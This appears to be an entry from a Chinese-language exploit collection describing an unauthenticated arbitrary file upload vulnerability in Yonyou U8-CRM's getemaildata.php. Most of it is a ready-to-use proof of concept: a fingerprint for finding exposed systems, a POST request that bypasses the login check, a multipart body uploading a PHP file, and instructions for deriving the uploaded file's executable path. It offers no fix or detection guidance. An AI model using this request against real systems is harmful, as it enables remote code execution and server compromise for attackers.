# 用友U8-CRMgetemaildata.php任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友 CRM"`
- **请求**：`POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 135`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php "
<?php phpinfo();?>
--00content0boundary00--

说明：
* 上传之后返回的路径为：D:\U8SOFT\turbocrm70\code\www\tmpfile\mht2AC0.tmp.mht直接访问这个文件不解析，需要访问另一个文件 。
* 修改`mht`为`upd`,`77ED`需要减1为`77EC`,,拼接后上传文件为：
/tmpfile/upd77EC.tmp.php
```

**其他**
- 用友U8-CRM getemaildata.php任意文件上传漏洞: * 一、漏洞简介
  * 二、影响版本
* 三、资产测绘
***
- 版本: * 用友U8-CRM